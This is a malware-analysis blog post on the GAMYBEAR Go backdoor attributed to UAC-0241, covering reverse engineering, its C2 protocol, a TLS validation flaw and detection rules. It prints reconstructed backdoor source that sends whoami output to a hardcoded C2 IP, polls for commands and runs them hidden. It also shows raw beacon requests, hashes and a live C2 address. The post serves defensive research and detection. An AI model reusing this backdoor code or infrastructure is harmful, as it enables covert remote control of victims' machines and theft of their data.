---
title: "From a pre-disclosure Triage submission to a hash-independent detection signal: reverse engineering UAC-0241's GAMYBEAR backdoor"
date: 2026-05-26 16:00:00 +0000
categories: [Investigations]
tags: [reverse-engineering, golang, threat-intelligence, malware-analysis, cert-ua, uac-0241, gamybear, tls, detection-engineering]
description: "An independent reverse engineering project against UAC-0241's GAMYBEAR Go-language backdoor — from pre-disclosure sample acquisition through full function-by-function reverse engineering, discovery of a Go default HTTP client TLS validation bug that renders the malware non-functional in clean Windows environments, and a hash-independent network detection signature that works against the entire kit family."
---

This is the narrative version of an independent reverse engineering project I ran against UAC-0241's GAMYBEAR backdoor. The full case file (78-page archive PDF, reconstructed Go source, YARA and Suricata rules, defanged IOCs in CSV and STIX 2.1 formats) lives on [GitHub](https://github.com/yankywilson/gamybear). This post is the human-readable version of how it actually unfolded.

---

## The starting point: a Triage submission with zero public coverage

The investigation started as routine corpus triage. I was working through recent Triage submissions tagged Go-compiled and looking for anything with a coverage anomaly, which is my standard intake filter. Most submissions are either obviously malicious and already well-documented or obviously benign. The interesting cases live in the middle: behaviorally suspicious, low or zero public coverage, recent.

I pulled one that caught my eye for a specific reason. The submission was scored **3/10 ("Likely benign")** by Triage's behavioral analyzer. No MITRE ATT&CK mappings. No family tag. But the file itself was a 7.1 MB Go-compiled PE32+ executable named `svshosts.exe`, and Go binaries this size with no detection coverage are unusual enough to merit a closer look.

The SHA-256 was `f4cfbd86609b558a76e43a8da7a47b211d4c498d1167b65bf43aa199e4a252fd`. I ran it through the standard initial-triage checks:

- **VirusTotal:** zero engine detections at the time of pull
- **Malpedia:** no entry for this hash or any obvious filename match
- **MITRE ATT&CK Groups:** no actor attribution surfaced
- **ETDA threat group encyclopedia:** no entry
- **Florian Roth's YARA rule repository:** no rule match
- **abuse.ch ThreatFox:** no record
- **Vendor blog search:** nothing

That's the kind of result that makes me clear my afternoon. A Go binary, 7.1 MB, scored as benign by automated analysis, with zero public coverage across every major source I check. Either it really was benign and I'd burned an hour, or it was something that hadn't been documented yet.

Triage's submission ID was `251110-p9qtmsbw6a`, dated **2025-11-10**. I noted the date because it was going to matter shortly. I downloaded the sample to an isolated FLARE-VM Windows 11 host with host-only networking and started staging the analysis environment.

The first thing that came back from `file` and `pecheck` was unremarkable: a console-mode PE32+ for x86_64 Windows, compiled with Go, with the standard Go runtime sections present. Nothing immediately distinctive. But then I ran the section table and saw `.zdebug_abbrev`, `.zdebug_line`, `.zdebug_frame`, `.zdebug_info`, `.zdebug_loc`, `.zdebug_ranges` — the full set of DWARF debug sections retained.

That was the first hint that the operator had made a mistake. Stripped Go binaries don't ship with `.zdebug_*` sections. The standard production build flag `-ldflags="-s -w"` removes them. This operator hadn't used those flags. Which meant DWARF was about to make this analysis dramatically easier than it should have been.

## Eight days before CERT-UA: confirming the coverage gap

While the Ghidra project was building, I went back to verify the coverage gap was real. I check this carefully before committing serious time to anything, because the cost of duplicating someone else's reverse engineering is high and the embarrassment is worse. The methodology I use is straightforward: check the major public sources, check the major private sources I have access to, and check security press for any coverage indexed by Google.

About thirty minutes in, I hit **CERT-UA Article 6286219** describing an intrusion set tracked as **UAC-0241** and a Go-language backdoor called GAMYBEAR. The advisory was published **2025-11-18**.

I looked back at my Triage download timestamp. The submission was from **2025-11-10**.

I had pulled the sample **eight days before CERT-UA's public disclosure**. The submitter was anonymous in the Triage interface, and there's no way to know whether they were an analyst at a victim organization, a researcher with their own intake pipeline, or the operator themselves performing a sandbox check. The provenance doesn't matter for my purposes — what matters is that the sample was sitting in a public sandbox more than a week before any advisory existed, with no detection coverage and no family tag, and the only person looking at it was me.

This is the case for systematic public-sandbox monitoring as a CTI intake pattern. Every major public sandbox — Triage, ANY.RUN, MalwareBazaar, VirusTotal Intelligence — is fed by operators, victims, IR teams and researchers continuously. Samples appear before anyone has decided to write about them. The pipeline exists. Most CTI shops don't systematically work it. This was the second piece of evidence that the investigation was going to be productive: not just that GAMYBEAR was undocumented at the binary level in Western reporting, but that the sample acquisition itself was pre-disclosure.

The coverage check confirmed what the initial triage suggested: no Malpedia entry, no MITRE Groups page, no commercial vendor writeup, no community YARA rule. CERT-UA's advisory itself was the only public source, and it contained no binary-level reverse engineering — it contained the standard CSIRT-advisory contents of file hashes, infrastructure IPs, a small set of behavioral observations, and an ATT&CK technique mapping. The binary's actual behavior had not been documented by anyone.

I checked the CERT-UA advisory's IOC list against my sample. The svshosts.exe SHA-256 was listed. A second variant filename, `ieupdater.exe` with SHA-256 `5d3f5d174369b34c436df0ad467236bd477b12b817768e19113969e08d74ef5d`, was also listed. The variant wasn't publicly available through Triage at the time of analysis — I checked. Single-sample limitation noted, work proceeded.

## What the operator left in the binary: DWARF and a developer's vanity

The first real surprise of the investigation was how generous the operator's OPSEC failure was. The unstripped DWARF debug sections were going to save me approximately a week of work.

I ran [Mandiant FLARE's GoReSym](https://github.com/mandiant/GoReSym) against the binary as my first move. GoReSym parses Go's `gopclntab` (program counter line table) section, recovers user-defined function symbols, and extracts build metadata embedded by the Go runtime. The output answered most of the questions I had about the binary's provenance:

- **GoVersion:** `go1.21.0` (released August 2023 — toolchain about two years old at advisory publication time)
- **BuildId:** `pXjhKBRwl8Jz266eHpWV/PU-FXAklZAtNjGwAHPJW/HuOjVeKNEbUINM8kbeOM/RRQaFKS5_cHsILydquqS`
- **Module dependencies:** `github.com/google/uuid v1.6.0` — single third-party module
- **User-defined functions:** 32 total symbols, of which **13 were `main.*`** functions (the operator's actual code) and the remainder were compiler-generated closures and equality functions

Thirteen functions of operator code. This is a small program. For comparison, a moderately featured commodity RAT runs hundreds of user-defined functions. GAMYBEAR is a single-file, single-purpose backdoor.

The DWARF debug info turned the analysis into something close to source-level reading. From the `.zdebug_info` section, I extracted compile-unit path entries that included the following strings:

```
Z:/Builder/out/g4myb34r_backdoor.go
C:/Users/fuckthereversers/go/pkg/mod/github.com/google/uuid@v1.6.0/uuid.go
C:/Users/fuckthereversers/go/pkg/mod/github.com/google/uuid@v1.6.0/version4.go
C:/Users/fuckthereversers/go/pkg/mod/github.com/google/uuid@v1.6.0/marshal.go
```

Four strings, recovered from a section the operator would have stripped if they'd known they should. Each one is operator-attributable.

The first string tells me the operator's source file is `g4myb34r_backdoor.go` (leetspeak for "gamybear"), sitting in a `Builder/out/` directory on a `Z:` drive. On Windows, `Z:` is conventionally a mapped network drive, which means the operator's build environment likely uses a shared build server with output written to a network share. This is uncommon for solo developers and common for small-team malware shops with shared infrastructure.

The second through fourth strings give me the developer's local Windows username: **`fuckthereversers`**. This is operator-supplied. Whoever this developer is, they chose that string as their Windows user account name, and it's now embedded in every binary they compile. It's also visible in the binary's `.zdebug_info` section forever, because they didn't strip it.

The string also tells me their Go module cache is at `C:/Users/fuckthereversers/go/pkg/mod/`, which is the default location. The operator hasn't customized their `GOPATH`. Combined with the `Z:` build drive, the picture I'm forming of the build environment is: Windows desktop, default Go toolchain installation, single mapped network drive for output, no environmental hygiene to remove identifying paths. Nothing about this looks like a mature offensive build pipeline.

DWARF also gave me struct type definitions directly, with field names:

```go
struct main.Config {
    C2_URL   string
    UUID     string
    HOSTNAME string
    IP       string
}

struct main.Response {
    Command   string
    Arguments string
}
```

Those are the operator's source struct names, recovered verbatim. And DWARF gives source-line mappings:

| Function | DWARF source location |
| --- | --- |
| `main.confExist` | line 33 |
| `main.register` | line 46 |
| `main.listener` | line 101 |
| `main.run_command` | line 145 |
| `main.executor` | line 167 |
| `main.sender` | line 183 |
| `main.main` | line 208 |

A 208+ line single-file Go program. Seven top-level functions averaging ~25 lines each. The shape of a project a developer could write in a single afternoon.

I want to be honest about what this OPSEC failure does and doesn't tell me. It does **not** tell me the developer's real-world identity. The username `fuckthereversers` is performative — the kind of name a developer chooses precisely because it gives no actionable attribution while still making a statement to anyone who eventually reverse engineers the binary. The build environment specifics (Windows desktop, network share for outputs, default Go installation) tell me about their workflow but don't connect to a person. What the OPSEC failure does do is make the binary trivially easy to reverse engineer compared to what it should have been. Stripped Go binaries are a real engineering challenge. This one was an exercise.

## Reverse engineering the bot: 13 functions, one obvious mistake

I loaded the binary into Ghidra with the GolangAnalyzerExtension plugin, imported the GoReSym function symbol table, and started walking the 13 `main.*` functions in dependency order. With the DWARF struct definitions plugged into Ghidra's type system, the decompiler output was readable enough that I could effectively work from reconstructed source.

The architecture is small and not idiomatic. The whole thing is built around three concurrent goroutines coordinated through Go channels. `main.main` is the coordinator: it loads or creates the bot's identity, allocates channels, spawns the workers, and blocks on a `sync.WaitGroup` that never decrements:

```go
func main() {
    url := "https://185.223.93.102"
    config := confExist(url)
    
    wg := &sync.WaitGroup{}
    wg.Add(3)
    
    commands := make(chan string)
    results  := make(chan map[string]string)
    
    go listener(config, commands, wg)
    go executor(config, commands, results, wg)
    go sender(config, results, wg)
    
    wg.Wait()
    close(commands)
    close(results)
}
```

The C2 URL `https://185[.]223[.]93[.]102` is hardcoded as a plaintext Go string literal in `.rdata`. No DGA, no domain rotation, no fallback list. A single IP, hardcoded, bare (no domain — direct dial to an IP over HTTPS).

`main.confExist` loads or creates the bot's identity record:

```go
func confExist(url string) Config {
    config := &Config{}
    path := os.Getenv("APPDATA") + "\\updater.json"
    
    data, err := os.ReadFile(path)
    if err != nil {
        data = register(url)
    }
    
    if err := json.Unmarshal(data, config); err != nil {
        fmt.Fprintf(os.Stdout, "%s", err)
    }
    
    return *config
}
```

The persistence file is `%APPDATA%\updater.json`. This is the bot's identity record — it stores the UUID assigned at first run so the bot can reuse the same identifier across reboots. The file's existence is a high-fidelity host-based indicator of GAMYBEAR execution, and it's not documented in the CERT-UA advisory.

`main.register` is the first-run setup function and the one with the most operationally significant content:

```go
func register(url string) []byte {
    botUUID := uuid.NewString()
    
    whoamiOut, _ := exec.Command("whoami").Output()
    hostnameB64 := base64.StdEncoding.EncodeToString(whoamiOut)
    
    wmicOut, _ := exec.Command(
        "wmic", "nicconfig", "where", "IPEnabled=true",
        "get", "IPAddress",
    ).Output()
    ipB64 := base64.StdEncoding.EncodeToString(wmicOut)
    
    config := Config{url, botUUID, hostnameB64, ipB64}
    configJSON, _ := json.Marshal(config)
    os.WriteFile(os.Getenv("APPDATA")+"\\updater.json", configJSON, 0o644)
    
    payload := map[string]string{
        "uuid":       botUUID,
        "hostname":   hostnameB64,
        "ip_address": ipB64,
    }
    payloadJSON, _ := json.Marshal(payload)
    
    resp, _ := http.DefaultClient.Post(
        url+"/register",
        "application/json",
        bytes.NewBuffer(payloadJSON),
    )
    defer resp.Body.Close()
    
    res := map[string]interface{}{}
    json.NewDecoder(resp.Body).Decode(&res)
    
    return configJSON
}
```

A few things to flag here.

First, the UUIDv4 is generated using the `github.com/google/uuid` package — the single third-party dependency. That's the only piece of non-stdlib code in the entire bot. It's also a clean network indicator if you can capture the raw beacon: the UUID format is a stable `[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}` regex.

Second, the hostname collection is `exec.Command("whoami").Output()`, followed by raw base64 encoding of the byte slice without trimming. Windows `whoami.exe` appends a CRLF (`\r\n`, bytes `0x0D 0x0A`) to its stdout output. The operator base64-encodes those bytes too. **Every observed GAMYBEAR registration beacon contains a hostname field whose base64 representation ends in `DQo=`** (which is base64 of `\r\n`). That's a stable beacon-side artifact — confirmed in the live detonation, see Section 7.

Third, the IP enumeration uses `wmic.exe`. Microsoft **removed wmic.exe from default Windows 11 installations starting in 22H2**. On any modern Windows 11 target, this exec call returns an error and an empty byte slice. The base64 of empty bytes is the empty string. The bot still ships its beacon with `"ip_address":""` and continues normally. The advisory doesn't note this environmental degradation, but it has detection-engineering implications: any captured GAMYBEAR registration beacon from a Windows 11 22H2+ host has an empty `ip_address` field, every time.

Fourth — and this is the one that mattered most for the rest of the investigation — `http.DefaultClient`. This appears in `main.register`, `main.listener`, and `main.sender`. Every C2 request the bot makes is dispatched through Go's default HTTP client. I noted this on first reading and kept going, but it's the line of code the entire defensive story turns on.

`main.listener` polls for commands:

```go
func listener(config Config, commands chan string, wg *sync.WaitGroup) {
    defer wg.Done()
    defer func() {
        if r := recover(); r != nil {
            log.Println(r)
        }
    }()
    
    for {
        pollURL := config.C2_URL + "/c2/get_commands/" + config.UUID
        resp, err := http.DefaultClient.Get(pollURL)
        if err != nil {
            log.Println(err)
            time.Sleep(5 * time.Second)
            continue
        }
        // ... response parsing ...
        if response.Command == "Nop" {
            time.Sleep(15 * time.Second)
        } else {
            commands <- response.Command
            commands <- response.Arguments
            time.Sleep(15 * time.Second)
        }
    }
}
```

The poll cadence is **5 seconds on error, 15 seconds on success or Nop**. That asymmetry shows up in the network telemetry and turns out to be useful for state-discrimination, which I'll get to.

`main.run_command` does the actual command execution:

```go
func run_command(command, arguments string) []byte {
    var cmd *exec.Cmd
    if arguments == "" {
        cmd = exec.Command(command)
    } else {
        args := strings.Split(arguments, " ")
        cmd = exec.Command(command, args...)
    }
    cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
    output, _ := cmd.Output()
    return output
}
```

Two things to note. First, the argument parser is `strings.Split(arguments, " ")` — a naive whitespace split that doesn't respect quoting. Any command with a quoted argument containing spaces (a path with spaces, a quoted string) breaks immediately. The operator either constrains themselves to single-token arguments or ships a wrapper. Second, the execution path is direct `exec.Command(...)`, **not** through `cmd.exe`. This means shell features (pipes, redirection, `&&`, environment expansion) don't work, and detection content keyed on `cmd.exe` as a child of svshosts.exe will never fire.

`main.sender` does result submission, and contains the bot's most fragile design choice:

```go
func sender(config Config, results chan map[string]string, wg *sync.WaitGroup) {
    defer wg.Done()
    for {
        result := <-results
        body, _ := json.Marshal(result)
        sendURL := config.C2_URL + "/c2/command_out/" + config.UUID
        
        resp, err := http.DefaultClient.Post(
            sendURL,
            "application/json",
            bytes.NewBuffer(body),
        )
        if err != nil {
            log.Fatal(err)  // <- calls os.Exit(1)
        }
        // ... rest ...
    }
}
```

`log.Fatal(err)`. The Go standard library's `log.Fatal` calls `os.Exit(1)` after logging. **A single transient POST failure kills the entire bot.** No retry, no backoff, no recovery. Contrast with the listener, which catches GET errors and continues. The asymmetric error handling between listener and sender is a fragility profile that doesn't appear in mature RAT frameworks.

That's the binary. Three concurrent workers, one coordinator, two structs, hardcoded everything, default HTTP client throughout, naive argument parsing, fragile error handling on the sender. Operator-authored Go code with a Python-influenced style (snake_case names, inline map literals where idiomatic Go would use a struct), with debug symbols left attached, written by someone who knew enough Go to ship a working program but not enough to ship a well-engineered one.

## The C2 protocol up close

The C2 protocol is small, plaintext-HTTPS-bodied, and structurally inconsistent across endpoints in a way that itself fingerprints the operator. There are three endpoint URLs:

```
POST /register
GET  /c2/get_commands/<UUIDv4>
POST /c2/command_out/<UUIDv4>
```

All three carry `Content-Type: application/json` on requests with bodies. All three use `http.DefaultClient`, so the User-Agent header is automatically set to `Go-http-client/1.1` and is identical across the bot's traffic. Accept-Encoding is `gzip`, also default Go behavior. These header characteristics are themselves a fingerprint: any Go binary built with default `net/http` produces the same header set.

The interesting part is the body schemas. Each endpoint uses a different JSON convention.

**Registration POST** (bot to C2, first run only):

```http
POST /register HTTP/1.1
Host: 185.223.93.102
User-Agent: Go-http-client/1.1
Content-Type: application/json
Accept-Encoding: gzip
Content-Length: <N>

{"uuid":"30372e5f-de32-4067-b253-13ef626e2e67","hostname":"ZGVza3RvcC0yaGo1NDVtXGZsYXJlDQo=","ip_address":""}
```

Snake_case keys throughout. The `hostname` field is base64 of `whoami` output with the CRLF preserved (so always ends in `DQo=`). The `ip_address` field is base64 of `wmic` output, which is empty on Windows 11 22H2+. Field order is non-deterministic because Go map iteration is randomized — defenders should match on field names, not order.

**Command poll GET** (bot to C2, every 15 seconds):

```http
GET /c2/get_commands/30372e5f-de32-4067-b253-13ef626e2e67 HTTP/1.1
Host: 185.223.93.102
User-Agent: Go-http-client/1.1
Accept-Encoding: gzip
```

UUID in path, no body. The C2 response uses **PascalCase** keys because the bot unmarshals it into the `main.Response` struct, which has Go-idiomatic exported field names (`Command`, `Arguments`) and no JSON tag override:

```http
HTTP/1.1 200 OK
Content-Type: application/json
Content-Length: 32

{"Command":"Nop","Arguments":""}
```

The Nop command is the keepalive. Any non-Nop command is treated as an executable name with whitespace-split arguments and dispatched through the executor goroutine.

**Result POST** (bot to C2, after each command):

```http
POST /c2/command_out/30372e5f-de32-4067-b253-13ef626e2e67 HTTP/1.1
Host: 185.223.93.102
User-Agent: Go-http-client/1.1
Content-Type: application/json
Accept-Encoding: gzip
Content-Length: <N>

{"uuid":"30372e5f-de32-4067-b253-13ef626e2e67","command":"whoami","output":"<base64 stdout>"}
```

Lowercase keys this time (`uuid`, `command`, `output`). UUID appears twice — in the URL path and the body — which is redundant but useful for server-side correlation. The `command` field echoes the original Command string from the C2's previous response, letting the C2 correlate output to a queued command without maintaining per-bot session state.

The on-disk persistence file uses **PascalCase struct field names with one JSON tag override**:

```json
{"update_server":"https://185.223.93.102","uuid":"<UUIDv4>","hostname":"<base64>","ip":"<base64-or-empty>"}
```

The `update_server` field is the only one with a JSON tag override (`json:"update_server"` on the C2_URL struct field). The rest use Go's default lowercased-first-letter behavior.

So the operator's protocol uses **three different JSON casing conventions** across four artifacts (registration, command poll response, result post, persistence file). This isn't an attempt at obfuscation — it's the artifact of an operator who built three endpoints at different times with different mental models, didn't refactor for consistency, and probably didn't notice. From a detection-engineering perspective the inconsistency is helpful, because each endpoint has a unique shape that doesn't collide with the others.

A note on the bot's sleep cadences, which produce a state-discrimination signal on the network. The listener sleeps **5 seconds after any error** (failed GET, JSON unmarshal failure, ReadAll error) and **15 seconds after success or Nop**. A bot in healthy operation produces requests at a 15-second cadence with Nop responses dominating during quiet periods. A bot in TLS-failure state produces requests at a 5-second cadence because the handshake fails and the error branch fires. The 5-second versus 15-second cadence on the wire tells you which state the bot is in — failure mode or operational. Either pattern is detectable; the failure-mode pattern is what defenders see when the operator's CA isn't pre-staged.

There's also a response decoded but never used. Both `/register` and `/c2/command_out/` server responses are unmarshaled into a `map[string]interface{}` and never read. The decode happens, the map is allocated, and the result is discarded. The most plausible explanation is operator preparation for future use — the protocol has space for the C2 to return server-assigned overrides (new C2 URL, configuration updates, unique keys) that the operator hasn't implemented yet. The bidirectional-but-vestigial pattern is consistent with iterative development of a tooling family that's expected to grow.

## The TLS bug that breaks Russian APT malware

The third time I read `http.DefaultClient` in the binary, I went to verify what I already suspected. Go's `net/http.DefaultClient` is a pre-constructed `*http.Client` with no `Transport` override. It inherits `net/http.DefaultTransport`, which is also pre-constructed with no `TLSClientConfig` override. The inherited TLS configuration is a zero-valued `tls.Config{}`.

A zero-valued `tls.Config` produces a TLS client that:

- Performs full certificate chain validation against the system trust store
- Has `InsecureSkipVerify` set to `false`
- Has `RootCAs` set to `nil`, which falls back to `crypto/x509.SystemCertPool()` on Windows
- Has `VerifyPeerCertificate` set to `nil` — no custom verification hook
- Requires hostname match against the server certificate's Subject Alternative Name extension (or, for IP-target dials, an IP SAN entry)

In other words: strict TLS validation with no bypass mechanism.

Then I went to look at what the C2 server presents. Triage's PCAP capture includes the TLS handshake from when their sandbox executed the bot. I extracted the server's Certificate message and parsed it. The C2 server presents a self-signed certificate with this subject DN:

```
CN=cloudflare-dns.com, O=Company Ltd, L=Moscow, ST=Moscow, C=RU
```

Self-signed. CN of `cloudflare-dns.com` (camouflage — it has nothing to do with Cloudflare). Moscow location attributes. Subject and issuer identical (the canonical signature of a self-signed cert). This certificate is not in any default Windows root trust store anywhere on the planet.

That's the bug. When the GAMYBEAR bot dials `https://185[.]223[.]93[.]102`, Go's TLS stack:

1. Walks the certificate chain from leaf to root. The chain has length 1 because the cert is self-signed.
2. Looks up the only candidate root (the leaf itself) in the system trust pool. Not found.
3. Returns `crypto/x509.UnknownAuthorityError`.
4. Emits a TLS Alert with description `bad_certificate(42)`, fatal.
5. Tears down the TCP connection.

The HTTP-layer call (`http.DefaultClient.Get` or `.Post`) returns an error of the form:

```
Get "https://185.223.93.102/c2/get_commands/...":
  tls: failed to verify certificate:
  x509: certificate signed by unknown authority
```

**The bot never completes a TLS handshake to its own C2 server on any clean Windows host.** It enters the listener's error branch:

```go
if err != nil {
    log.Println(err)
    time.Sleep(5 * time.Second)
    continue
}
```

Five-second sleep. Retry. Same failure. Five-second sleep. Retry. Forever.

For real-world functionality, the operator needs the certificate to be trusted on the victim host. The only way this works is if a separate kill-chain stage installs the operator's CA into the Windows trust store **before** the GAMYBEAR binary runs. CERT-UA's advisory documents an upstream PowerShell stage (`updater.ps1`) that drops the GAMYBEAR binary. The advisory doesn't describe what else `updater.ps1` does, but the binary's behavior leaves no other plausible explanation: the PowerShell stage must be performing the cert install, because otherwise the bot is inert on every target.

This is the structural defensive opportunity. The operator's kill chain has a load-bearing assumption that the upstream stage lands cleanly. Every host they target either becomes a compromised endpoint (because the cert install succeeded) or becomes a noisy 5-second-cadence TLS-failure signal in network logs (because the cert install didn't happen, or the bot ended up somewhere the operator didn't expect — like an analyst's lab). There's no quiet third option.

I want to be clear about what this finding does and doesn't mean. It does not mean GAMYBEAR is harmless. The bot still gets onto victim machines through the documented PowerShell-driven kill chain, and the kill chain still works — real Ukrainian institutions are dealing with the consequences. What it means is that defenders have two independent detection opportunities: the upstream cert-install operation (the high-leverage hunt target) and the bot's own failure pattern (the bot-side signal when something goes wrong on the operator's side).

## Persistence: the advisory's small mischaracterization

CERT-UA#18329 describes the GAMYBEAR family as establishing persistence through HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run. Based on static reverse engineering and dynamic detonation, this attribution is incorrect for the GAMYBEAR binary itself.

The binary contains **no calls to any registry-modification API**. Verified two ways. First, the PE import table includes no ADVAPI32.dll registry functions — no `RegOpenKeyExW`, no `RegSetValueExW`, no `RegCreateKeyW`. Second, the binary's symbol table contains no references to the `golang.org/x/sys/windows/registry` package that Go programs use to manipulate the registry. The binary cannot write to the registry because it has no code path that calls registry APIs.

The most plausible source for the autorun key write is the upstream `updater.ps1` PowerShell stage, which has the privileges and the standard library to do it. CERT-UA's IR investigation would have observed the autorun key on victim hosts and attributed it to the kill chain generally, which is correct — the key write is part of the intrusion. But attributing it specifically to the GAMYBEAR binary is not supported by the binary's actual code.

This matters for detection engineering. A Sigma rule keyed on `svshosts.exe` or `ieupdater.exe` writing the Run registry key will never trigger, because the documented process names don't perform the documented behavior. Correct detection requires monitoring the PowerShell stage writing the Run key, with a target value pointing into `%APPDATA%`. That's a different rule against a different process.

To be clear, this is a structural feature of how IR-derived advisories work, not a critique of CERT-UA specifically. IR investigations observe the artifacts on the victim host. They don't typically perform binary analysis of every dropped payload. When an autorun key appears, the natural attribution is "the malware did it" — and at the kill-chain level, that's true. At the binary level, it's a different process in the chain. The advisory and the binary tell consistent stories at different levels of granularity. Both are correct in their own framing. The gap is where detection-engineering false negatives live.

The binary's actual persistence artifact is the JSON identity file at `%APPDATA%\\updater.json`. This file is high-confidence indicator of GAMYBEAR execution and is not documented in the advisory. The schema is:

```json
{
  "update_server": "https://185.223.93.102",
  "uuid": "<UUIDv4>",
  "hostname": "<base64-of-whoami-stdout>",
  "ip": "<base64-of-wmic-stdout-or-empty>"
}
```

File-creation monitoring on this exact path identifies GAMYBEAR execution regardless of which filename variant the operator deploys (svshosts.exe, ieupdater.exe, or any future renaming). It survives variant rotation. The Sigma rule for this is in the [repo](https://github.com/yankywilson/gamybear).

## Sixty minutes of failed handshakes

The static analysis case for the TLS failure was strong, but I wanted empirical confirmation. I ran the bot live on a clean FLARE-VM Windows 11 host (build 10.0.26200), with [FakeNet-NG](https://github.com/mandiant/flare-fakenet-ng) listening on the simulated network interface. FakeNet presents its own self-signed certificate for HTTPS interception. The operator's CA was not installed on the host (the entire point of the test).

The bot launched, allocated three goroutines, entered the listener loop and started polling. FakeNet captured every TCP connection attempt to port 443. Every single TLS handshake terminated with a client-side `bad_certificate(42)` alert. **For sixty minutes of bot runtime, zero application-layer HTTP requests reached FakeNet's HTTP listener.** The bot never registered, never received a command, never sent any data.

The only thing the bot accomplished during the entire detonation was creating `%APPDATA%\\updater.json`. Captured contents:

```json
{"update_server":"https://185.223.93.102","uuid":"30372e5f-de32-4067-b253-13ef626e2e67","hostname":"ZGVza3RvcC0yaGo1NDVtXGZsYXJlDQo=","ip":""}
```

The hostname value `ZGVza3RvcC0yaGo1NDVtXGZsYXJlDQo=` decodes to `desktop-2hj545m\flare\r\n` — the FLARE-VM hostname with the trailing CRLF from `whoami.exe`'s stdout. The `ip` field is empty, consistent with `wmic.exe` being absent on Windows 11 22H2+.

The hex dump of the decoded hostname:

```
64 65 73 6B 74 6F 70 2D 32 68 6A 35 34 35 6D 5C  desktop-2hj545m\
66 6C 61 72 65 0D 0A                              flare<CR><LF>
```

Last two bytes: `0D 0A`. The CRLF that creates the `DQo=` base64 suffix in every observed GAMYBEAR registration beacon.

Post-detonation registry inspection confirmed no autorun key was written by the binary:

```powershell
PS> Get-ItemProperty 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' | Format-List

OneDrive : "C:\Program Files (x86)\Microsoft OneDrive\OneDrive.exe" /background
```

Only the system-default OneDrive entry. No svshosts.exe, no GAMYBEAR-attributable autorun key. The static analysis prediction was correct.

The bot also created no scheduled tasks, no services, no WMI event subscriptions. The only persistence-relevant artifact was `%APPDATA%\\updater.json`.

Total bot runtime: 61 minutes. Total network impact: approximately 12 TLS handshake attempts per minute, all failing, all logged. Total host impact: one JSON file, no autorun key, no other changes. **In a clean environment without operator pre-staging, GAMYBEAR is a piece of network noise that doesn't accomplish anything.**

## The detection signal hiding in TLS metadata

The TLS-failure pattern is itself a detection opportunity, and a very good one. Any environment running TLS metadata logging — Zeek's `ssl.log` with validation status, Suricata's `tls.log` with alert descriptions, Corelight, ExtraHop, most modern NDR platforms — already captures the field needed to detect this. The relevant fields are `tls.alert_description` in Suricata, `ssl.validation_status` in Zeek, or the vendor equivalent for client-side TLS alerts.

The signature is concrete and hash-independent:

- **Direction:** outbound, client-to-server
- **Destination port:** 443
- **TLS version:** 1.3
- **JA3:** `397c55c9aaf9820f7655666ee7fc3c2d` (default Go crypto/tls Client Hello)
- **JA4:** `t13i1910h2_9dc949149365_e7c285222651`
- **Server cert chain validation:** failed
- **Client alert:** `bad_certificate(42)`, fatal
- **Cadence:** approximately 12 attempts per minute, sustained for hours

A Suricata rule against the known C2 IP fires immediately:

```
alert tls $HOME_NET any -> 185.223.93.102 443
  (msg:"GAMYBEAR TLS validation failure to known C2";
   flow:to_server,established;
   tls.alert_description:bad_certificate;
   threshold:type both, track by_src, count 5, seconds 60;
   sid:9000001; rev:1;)
```

The C2 IP is a stable indicator for now but will rotate eventually. A more durable rule keys on the Go-default JA3 plus the `bad_certificate` alert against any destination outside the defender's allowlist, threshold-rated to fire on sustained pattern rather than one-off failures. A practical starting threshold is five or more `bad_certificate` alerts from the same source host within 60 seconds, repeated across at least three consecutive minutes. This suppresses one-off mTLS misconfigurations and certificate-rotation churn while catching the GAMYBEAR pattern within roughly four minutes of execution.

The hash-independence is important. The signature works regardless of:

- Which filename the operator ships (svshosts.exe vs ieupdater.exe vs any future renaming)
- Which file hash the operator's build produces (every rebuild changes the SHA-256)
- Whether the operator rotates the C2 IP
- Whether the operator changes the certificate template

The signature only stops working if the operator changes the Go HTTP client implementation. That's a specific code change in `main.register`, `main.listener`, and `main.sender` — replacing every `http.DefaultClient` call with a custom client using `tls.Config{InsecureSkipVerify: true}` or proper cert pinning. If they make that change, my detection content stops working and the bot finally starts working. Either of those outcomes is observable; both produce intelligence.

The second detection point is the upstream CA-install operation. When the PowerShell dropper writes a non-system root cert into `HKLM\\Software\\Microsoft\\SystemCertificates\\Root\\Certificates\\`, that's a Sysmon Event ID 13 RegistryValueSet event under a non-administrative `powershell.exe` process, with a target object path containing a thumbprint subkey. Legitimate enterprise software almost never writes to this hive at runtime from a non-elevated context. A Sigma rule scoped to that registry path, that process, and excluding system contexts is a high-confidence signal in most environments.

Catching the cert-install operation catches the intrusion before the binary actually runs. That's the higher-leverage detection point. The TLS-failure pattern catches the bot after it's running but before it accomplishes anything. Either point is a win; both together cover the campaign across the kill chain.

## Infrastructure: pivot dead-ends and what they mean

After the binary analysis, I tried to map the operator's broader infrastructure through Censys pivots. The results were mostly negative, but the negatives are documentable findings in their own right.

The C2 host `185[.]223[.]93[.]102` sits in AS14576 HOSTING-SOLUTIONS LIMITED, geolocated in Amsterdam. Censys indexes the host on ports 22 (SSH), 111 (Portmap), and 2525 (SMTP). **Port 443 is not indexed** — Censys has never captured a certificate or service banner from port 443 on this host. There are three plausible explanations: the listener may be allowlisted to specific source IP ranges and rejects scanner-shaped probes; the listener may drop or throttle scanner traffic; the listener may have been offline during Censys' scan passes. From an operator perspective, scanner-invisibility on the C2 port is sound defensive posture against threat intelligence platforms.

I attempted three exact-match Censys pivots using the captured C2 certificate:

| Censys query | Result |
| --- | --- |
| `services.cert.parsed.fingerprint_sha256 = 0c954b88...` | **0 hits** |
| `services.cert.parsed.subject_key_info.fingerprint_sha256 = 9c1daf9d...` | **0 hits** |
| `services.cert.parsed.serial_number = 0x75ffd826...` | **0 hits** |

Three exact pivots, three zero results. The exact certificate served by GAMYBEAR's C2 appears on no other host indexed by Censys. Either the certificate is unique to this single C2 (consistent with operator compartmentalization), or sibling hosts have rotated certs faster than Censys' scan cadence, or sibling hosts present different certs.

